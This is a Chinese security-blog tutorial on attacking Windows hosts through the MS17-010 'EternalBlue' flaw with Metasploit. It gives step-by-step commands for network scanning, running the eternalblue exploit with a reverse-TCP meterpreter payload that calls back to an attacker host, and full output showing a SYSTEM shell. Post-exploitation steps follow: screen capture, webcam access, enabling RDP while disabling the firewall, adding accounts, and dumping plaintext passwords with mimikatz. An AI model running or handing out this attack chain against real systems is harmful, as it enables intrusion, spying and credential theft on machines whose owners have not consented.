> 原文链接: https://www.anquanke.com//post/id/86245 


# 【技术分享】MSF框架实现“永恒之蓝”的闪电攻击


                                阅读量   
                                **467547**
                            
                        |
                        
                                                            评论
                                <b>
                                    <a target="_blank">1</a>
                                </b>
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



**[![](https://p5.ssl.qhimg.com/t01b566d2def9b2f29b.png)](https://p5.ssl.qhimg.com/t01b566d2def9b2f29b.png)**

****

作者：[myles007](http://bobao.360.cn/member/contribute?uid=749283137)

预估稿费：300RMB

投稿方式：发送邮件至linwei#360.cn，或登陆网页版在线投稿

**<br>**

**一、攻击简介**

在NSA工具箱刚刚放出来的时候，大家都在学习怎么玩转这个工具箱中的“永恒之蓝”的攻击，相信每个小伙伴学习的使用的时，都很不适应并很是花费了一番周折才搞定它吧，而且每次使用还要准备好相应的条件，今天就跟大家分享下我们刚刚学习到利用MSF框架快速搞定“MS017-010”漏洞。

其实我们这里所说的使用MSF 实现 “永恒之蓝”的快速攻击，就是**利用Metasploit中近期更新的针对ms17-101漏洞的攻击载荷进行攻击获取主机控制权限。我这里简单的记录下整个攻击利用所需要的工具准备、利用过程以及后渗透的一些简单内容。**

<br>

**二、工具准备**

那接下来让我们准备下相关的工具吧，相信大家肯定会说，不还是要准备环境吗，其实这个环境都是大家进程用到的基本工具环境，只是做下简单准备就OK了。

**2.1 nmap 环境准备**

（1）请将Nmap安装到当前最新版本(7.40以上)； 

（2）确保 script脚本中包含smb-vuln-ms17-010.nse脚本； 

在后面扫描检测是需要用到此脚本进行漏洞扫描检查，有关script脚本的存放位置在Nmap安装根目录下的有个“script”目录，直接进入搜索“ms17-010”，存在则无需再下载。 

（3）相关软件下载 

nmap下载地址：[https://nmap.org/download.html](https://nmap.org/download.html)    

smb-vuln-ms17-010.nse下载地址：[https://nmap.org/nsedoc/scripts/smb-vuln-ms17-010.html](https://nmap.org/nsedoc/scripts/smb-vuln-ms17-010.html) 

**2.2 MSF 环境准备**

metasploit 其默认在kali中就自带有整个攻击框架，后续我们对我们简称其为MSF框架。因为我们要用到针对“永恒之蓝”漏洞的攻击，故需要将MSF框架升级到最新版本，至少在4.14.17版本以上。

**2.2.1 kali环境要求**

建议大家直接使用kali2.0的环境，这样后续进行MSF框架的升级也比较方便，不容易出现各种未知的问题，方面我们后续渗透攻击的展开。

（1） 编辑 kali 更新源 

首先我配置kali的更新源：直接编辑更新源的配置文件“/etc/apt/sources.list” ,然后将下面的源复制进去保存即可。 

国内kali镜像更新源：



```
1.#阿里云Kali源
2.deb http://mirrors.aliyun.com/kali kali main non-free contrib 
3.deb-src http://mirrors.aliyun.com/kali kali main non-free contrib 
4.deb http://mirrors.aliyun.com/kali-security kali/updates main contrib non-free
```

配置完源配置文件后，直接进行更新安装，具体命令如下。

```
root@kali:~# apt-get update &amp;&amp; apt-get upgrade &amp;&amp; apt-get dist-upgrade
```

（2）更新 kali系统 

kali 源更新完后，我们进kali 内核的更新，具体更方法如下。

```
root@kali:apt-get install linux-headers-$(uname -r)
```

注：如果报错了的话可以输入这个试试

```
aptitude -r install linux-headers-$(uname -r
```

**2.2.2 MSF攻击框架版本要求**

MSF框架版本要求在 4.11.17版本以上，具体版本查看方法如下。



```
1.# msfconsole  #进入框架
2.msfconsole&gt; version
```



**三、主机发现**

对于主机的发现，我们可以使用的方法很多，这里简单记录和说明几种，供大家共同学习，每个人可根据主机的喜欢选择使用。

**3.1 fping**

在kali 系统同自带有fping这个扫描工具，有关于主机发现的扫描命令如下。

```
fping -asg 192.168.1.0/24
```

**3.2 nbtscan**

在 kali 中自带有nbtscan这个同网段主机发现工具，有关扫描命令记录下发。

```
nbtscan -r 192.168.1.0/24
```

**3.3 nmap**

关于namp 主机发现与扫描功能的强大，我们这里简单了记录几种个人常用的扫描方法。

（1） ping 包扫描

```
nmap -n -sS 192.168.1.0/24
```

（2） 指定端口发现扫描

```
nmap -n -p445 192.168.1.0/24 --open
```

（3） 针对漏洞脚本的定向扫描

```
nmap -n -p445 --script smb-vuln-ms17-010 192.168.1.0/24 --open
```

以上扫描中，针对本次演示攻击中的主机发现扫描，个人推荐使用 nmap -n -p445 192.168.1.0/24 –open 其扫描发现的效率最高。

<br>

**四、漏洞扫描**

在确定目标范围中那些主机是存活后，我们可以进行定向445端口的漏洞脚本扫描了，直接找到存在漏洞的目标主机，为后续的MSF攻击提供目标。 

其实说到这里，大家会发现上面第三章节“主机发现”这一步，我们可以直接跳过，直接进定向445共享端口的漏洞扫描，上面之所以写出了，也是为了自己以后的学习和使用做一个笔记和记录。

**4.1 Nmap 漏洞扫描**

MS17-101漏洞定向扫描命令如下：



```
nmap -n -p445 --script smb-vuln-ms17-010 192.168.1.0/24 --open
1.Starting Nmap 7.40 ( https://nmap.org ) at 2017-06-06 09:38 ?D1迆㊣那℅?那㊣??
2.Nmap scan report for 192.168.1.1
3.Host is up (0.00088s latency).
4.PORT    STATE  SERVICE
5.445/tcp closed microsoft-ds
6.MAC Address: 94:0C:6D:11:9F:CE (Tp-link Technologies)
7.
8.Nmap scan report for 192.168.1.103
9.Host is up (0.072s latency).
10.PORT    STATE    SERVICE
11.445/tcp filtered microsoft-ds
12.MAC Address: 38:A4:ED:68:9E:25 (Xiaomi Communications)
13.
14.Nmap scan report for 192.168.1.109
15.Host is up (0.0059s latency).
16.PORT    STATE  SERVICE
17.445/tcp closed microsoft-ds
18.MAC Address: 60:02:B4:7B:4D:93 (Wistron Neweb)
19.
20.Nmap scan report for 192.168.1.112
21.Host is up (0.0040s latency).
22.PORT    STATE SERVICE
23.445/tcp open  microsoft-ds
24.MAC Address: 48:D2:24:FF:6A:CD (Liteon Technology)
25.
26.Host script results:
27.| smb-vuln-ms17-010: 
28.|   VULNERABLE:
29.|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
30.|     State: VULNERABLE
31.|     IDs:  CVE:CVE-2017-0143
32.|     Risk factor: HIGH
33.|       A critical remote code execution vulnerability exists in Microsoft SMBv1
34.|        servers (ms17-010).
35.|       
36.|     Disclosure date: 2017-03-14
37.|     References:
38.|       https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
39.|       https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
40.|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
```

通过Nmap 的445端口定向漏洞扫描发现 192.168.1.112 存在MS17-010漏洞。

**4.2 MSF Auxiliary 辅助扫描**

其实如果不直接使用namp进行漏洞定向扫描，我们也可以直接使用MSF框架的辅助模块“”auxiliary”中的扫描模块进行扫描。了解MSF的同学肯定都知道，MSF的扫描模块基本也就是调用nmap扫描来实现的。这里就简单记录下这个“auxiliary/scanner/”扫描模块的下漏洞扫描方法。



```
msfconsole # 进入MSF框架 
version # 确认下MSF的版本 
search ms17_010 # 查找漏洞模块的具体路径 
use auxiliary/scanner/smb/smb_ms17_010 # 调用漏洞扫描模块 
show option # 查看模块配置选项 
set RHOST 192.168.1.1-254 # 配置扫描目标 
set THREADS 30 #配置扫描线程 
run #运行脚本
```

这个使用下来，我们发现其实还没有namp 一条命令就搞定了，来的方便。

<br>

**五、MSF 漏洞利用过程**

通过以上所有环境的准备和漏洞扫描主机的发现，接下来使用MSF框架进行MS17-10漏洞的攻击，也就是“几秒”中的事情了，具体使用方法和过程记录如下。

**5.1 ms17-010 漏洞利用之MSF使用方法**



```
msfconsole # 进入MSF 框架 
version # 确保MSF框架版本在 4.14.17以上； 
search ms17_010 # 漏洞模块路径查询 
set exploit/windows/smb/ms17_010_eternalblue # 调用攻击模块
set RHOST 192.168.1.112 # 设定攻击目标 
exploit # 发起攻击
```

**5.2	ms17-010 漏洞攻击MSF框架实践记录**

**5.2.1 漏洞模块路径查询**

[![](https://p3.ssl.qhimg.com/t0191725159b8a0f52c.png)](https://p3.ssl.qhimg.com/t0191725159b8a0f52c.png)

**5.2.2 调用和配置exploit攻击参数**

[![](https://p4.ssl.qhimg.com/t01d6cf8e8df4d3f385.png)](https://p4.ssl.qhimg.com/t01d6cf8e8df4d3f385.png)

**5.2.3 发起攻击**

[![](https://p1.ssl.qhimg.com/t018b66ef2cc811c7a6.png)](https://p1.ssl.qhimg.com/t018b66ef2cc811c7a6.png)

**5.2.4 获取shell**

获取的shell 后，我们可以通过名getuid查看下当前用户的权限。

[![](https://p1.ssl.qhimg.com/t01dbaffd91722e1bcf.png)](https://p1.ssl.qhimg.com/t01dbaffd91722e1bcf.png)

<br>

**六、维持访问**

这里的说到维持访问，主要是想记录下关于使用meterpreter这个攻击载荷模块，我们在利用漏洞的过程中，如果可以使用meterpreter攻击载荷模块，尽量使用这个模块。

**6.1 payload 攻击载荷理论**

说到这里就就普及下MSF框架下关于“payload”攻击载荷的基本概念，那么什么是payload呢？

payload又称为攻击载荷，主要是用来建立目标机与攻击机稳定连接的，并返回一个shell，也可以进行程序注入等，payload有3种类型。 

**（1）singles（独立载荷） **

独立载荷，可直接植入目标系统并执行相应的程序，如：shell_bind_tcp这个payload。 

**（2）stagers（传输器载荷） **

传输器载荷，就是用于目标机与攻击机之间建立稳定的网络连接，与传stages（输体载荷配）合攻击。通常该种载荷体积都非常小，可以在漏洞利用后，方便进行注入，这类载荷功能都非常相似，大致分为bind型和reverse型。

bind型：需要攻击机主动连接目标端口的； 

reverse型：目标机会反向连接攻击机，需要提前设定好连接攻击机的ip地址和端口号的配置。 

**（3）stages（传输体） **

传输体载荷，如shell，meterpreter等。在stagers建立好稳定的连接后，攻击机将stages传输给目标机，由stagers进行相应处理，将控制权转交给stages。比如得到目标机的shell，或者meterpreter控制程序运行。这样攻击机可以在本端输入相应命令控制目标机。

由此可见，meterpreter其实就是一个payload，它需要stagers（传输器）和相应的stages（传输体）配合运行，meterpreter是运行在内存中的，通过注入dll文件实现，在目标机硬盘上不会留下文件痕迹，所以在被入侵时很难找到。真因为这点，所以meterpreter非常可靠稳定优秀。

**6.2 payload 攻击载荷理解**

上面说了这么多，可能大家看起来比较费劲难以理解，其实简单的理解就是说payload攻击载荷有2个大的类型：

**（1） 独立体（single） **

从这个英文单词single,就可以大概知道这类payload是个独立，单独的意思，其实在结合定义我们就可以看出，攻击载荷一般做两件事情 

一、就是建立目标主机与攻击主机之间的网络连接； 

二、就是在连接建立的基础上获取目标主机的控制权限，即获取可供操作的shell。

**（2）结合体payload **

在理解了一个完整的payload是有两部分组成的基础上，我们可以理解我们这里所说的结合体了，其实就是将原本的single独立体分割为了两个部分：“传输器载荷”与“传输体载荷”（stages &amp; stagers）

比如“windows/meterpreter/reverse_tcp”是由一个传输器载荷（reverse_tcp）和一个传输体载荷（meterpreter）所组成的，其功能等价于独立攻击载荷“windows/shell_reverse_tcp”

**6.3 meterpreter 攻击载荷实战**

我们这里就使用MS17-010漏洞渗透模块结合meterpreter攻击载荷模块进行一次实战演练,通过永恒之蓝漏洞我们来获取一个meterpreter，顺道看meterpreter功能的强大之处。

其他攻击流程与前面基本相同，唯独多了一个配置 payload攻击载荷的过程，具体配置如下。

**6.3.1 攻击载荷配置过程**

调用exploit 攻击



```
use exploit/windows/smb/ms17_010_eternalblue 
set rhost 192.168.1.112
```

配置攻击载荷



```
set payload windows/x64/meterpreter/reverse_tcp 
set lhost 192.168.1.118
```

发起攻击

```
exploit
```

获取shell

```
getuid
```

**6.3.2 具体实操过程记录**



```
1.msf &gt; use exploit/windows/smb/ms17_010_eternalblue          # 调用ms17-010永恒之蓝漏洞攻击模块
2.msf exploit(ms17_010_eternalblue) &gt; set rhost 192.168.1.112 # 设定攻击目标 192.168.1.112
3.rhost =&gt; 192.168.1.112
4.msf exploit(ms17_010_eternalblue) &gt; set payload windows/x64/meterpreter/reverse_tcp # 调用反弹的攻击载荷 
5.payload =&gt; windows/x64/meterpreter/reverse_tcp
6.msf exploit(ms17_010_eternalblue) &gt; set lhost 192.168.1.118 # 设定将meterpreter 反弹给192.168.1.118
7.lhost =&gt; 192.168.1.118
8.msf exploit(ms17_010_eternalblue) &gt; show options  # 查询攻击参数设置
9.
10.Module options (exploit/windows/smb/ms17_010_eternalblue):
11.
12.   Name                Current Setting  Required  Description
13.   ----                ---------------  --------  -----------
14.   GroomAllocations    12               yes       Initial number of times to groom the kernel pool.
15.   GroomDelta          5                yes       The amount to increase the groom count by per try.
16.   MaxExploitAttempts  3                yes       The number of times to retry the exploit.
17.   ProcessName         spoolsv.exe      yes       Process to inject payload into.
18.   RHOST               192.168.1.112    yes       The target address
19.   RPORT               445              yes       The target port (TCP)
20.   VerifyArch          true             yes       Check if remote architecture matches exploit Target.
21.   VerifyTarget        true             yes       Check if remote OS matches exploit Target.
22.
23.
24.Payload options (windows/x64/meterpreter/reverse_tcp):
25.
26.   Name      Current Setting  Required  Description
27.   ----      ---------------  --------  -----------
28.   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
29.   LHOST     192.168.1.118    yes       The listen address
30.   LPORT     4444             yes       The listen port
31.
32.
33.Exploit target:
34.
35.   Id  Name
36.   --  ----
37.   0   Windows 7 and Server 2008 R2 (x64) All Service Packs
38.
39.
40.msf exploit(ms17_010_eternalblue) &gt; exploit     # 发起攻击
41.
42.[*] Started reverse TCP handler on 192.168.1.118:4444 
43.[*] 192.168.1.112:445 - Connecting to target for exploitation.
44.[+] 192.168.1.112:445 - Connection established for exploitation.
45.[+] 192.168.1.112:445 - Target OS selected valid for OS indicated by SMB reply
46.[*] 192.168.1.112:445 - CORE raw buffer dump (23 bytes)
47.[*] 192.168.1.112:445 - 0x00000000  57 69 6e 64 6f 77 73 20 37 20 55 6c 74 69 6d 61  Windows 7 Ultima
48.[*] 192.168.1.112:445 - 0x00000010  74 65 20 36 2e 31 00                             te 6.1         
49.[+] 192.168.1.112:445 - Target arch selected valid for OS indicated by DCE/RPC reply
50.[*] 192.168.1.112:445 - Trying exploit with 12 Groom Allocations.
51.[*] 192.168.1.112:445 - Sending all but last fragment of exploit packet
52.[*] 192.168.1.112:445 - Starting non-paged pool grooming
53.[+] 192.168.1.112:445 - Sending SMBv2 buffers
54.[+] 192.168.1.112:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.
55.[*] 192.168.1.112:445 - Sending final SMBv2 buffers.
56.[*] 192.168.1.112:445 - Sending last fragment of exploit packet!
57.[*] 192.168.1.112:445 - Receiving response from exploit packet
58.[+] 192.168.1.112:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!
59.[*] 192.168.1.112:445 - Sending egg to corrupted connection.
60.[*] 192.168.1.112:445 - Triggering free of corrupted buffer.
61.[*] Sending stage (1189423 bytes) to 192.168.1.112
62.[*] Meterpreter session 1 opened (192.168.1.118:4444 -&gt; 192.168.1.112:49177) at 2017-06-07 13:42:17 +0800
63.[+] 192.168.1.112:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
64.[+] 192.168.1.112:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
65.[+] 192.168.1.112:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
66.
67.meterpreter &gt; getuid    # 查询当前用户权限为SYSTEM,获取到到最高权限
68.Server username: NT AUTHORITYSYSTEM
69.meterpreter &gt; sysinfo   # 系统信息查询，当前系统为 Windows7
70.Computer        : CHINAMAN-PC
71.OS              : Windows 7 (Build 7600).
72.Architecture    : x64
73.System Language : zh_CN
74.Domain          : WORKGROUP
75.Logged On Users : 0
76.Meterpreter     : x64/windows
77.meterpreter &gt;
```

**6.3.3 meterpreter 功能展现**

（1）桌面抓图 

1.	meterpreter &gt; screenshot

[![](https://p4.ssl.qhimg.com/t01bc81a356791d7ced.png)](https://p4.ssl.qhimg.com/t01bc81a356791d7ced.png)

（2）视频开启 

1.	meterpreter &gt; webcam_scream

[![](https://p3.ssl.qhimg.com/t019c351d42002bfd35.png)](https://p3.ssl.qhimg.com/t019c351d42002bfd35.png)

（3）开启远程桌面 

1.	&gt; meterpreter &gt; run post/windows/manage/enable_rdp 

2.	此命令可以帮我们一建开启远程桌面，并帮我们关闭防火墙，真的牛xxx.

注：一开始使用命令 run getgui -u admin -p passw0rd 没能开启远程RDP桌面，后来才查询到上面这个攻击脚本。当然并不是说，就不能用哦。

（4）添加账号 

直接进入系统shell,添加账号（结果失败）



```
1.&gt; shell
2.&gt; net user test 123 /add
```

3.	… # 一直没有回显，怀疑是由于安装了360导致的，后来进过验证的确是这原因，所有说安装个360还是很有用的，不要总是说人家是流氓软件，不是打广告哈,切实感受…

（5）获取系统管理密码 

想直接添加账号进行提权，前面操作是不了，那么我们现在就出杀手锏，直接使用mimikatz来获取系统管理账号的密码。 

第一步：载入mimikatz

1.	meterpreter &gt; load mimikatz

第二步：使用命令wdigest获取密码



```
1.meterpreter &gt; wdigest
2.[+] Running as SYSTEM
3.[*] Retrieving wdigest credentials
4.wdigest credentials
5.===================
6.
7.AuthID    Package    Domain        User           Password
8.------    -------    ------        ----           --------
9.0;997     Negotiate  NT AUTHORITY  LOCAL SERVICE  
10.0;996     Negotiate  WORKGROUP     CHINAMAN-PC$   
11.0;47327   NTLM                                    
12.0;999     NTLM       WORKGROUP     CHINAMAN-PC$   
13.0;636147  NTLM       ChinaMan-PC   ChinaMan       mima-009
14.&gt;
```

注：Mimikatz 的命令帮助：



```
1.Mimikatz Commands
2.=================
3.
4.    Command           Description
5.    -------           -----------
6.    kerberos          Attempt to retrieve kerberos creds
7.    livessp           Attempt to retrieve livessp creds
8.    mimikatz_command  Run a custom command
9.    msv               Attempt to retrieve msv creds (hashes)
10.    ssp               Attempt to retrieve ssp creds
11.    tspkg             Attempt to retrieve tspkg creds
12.    wdigest           Attempt to retrieve wdigest creds
```

（6）远程桌面连接之 

另开启一个terminal，使用名rdesktop 连接远程桌面 

```
1.root# rdesktop 192.168.1.112 -u user -p passw0rd
```

有关meterpreter 的功能还有很多，这里就不足做过多的说明了，就是简单记录下本次实战演练过程中遇到的各种问题和小技能有关其他的功能使用可以参考其他文档做进一步的学习。

<br>

**参考学习**

[https://www.zybuluo.com/mdeditor#728079-full-reader](https://www.zybuluo.com/mdeditor#728079-full-reader) 

[https://www.hx99.net/Article/Tech/201505/36750.html](https://www.hx99.net/Article/Tech/201505/36750.html) 

[http://blog.sina.com.cn/s/blog_4c86552f0102wll1.html](http://blog.sina.com.cn/s/blog_4c86552f0102wll1.html) 
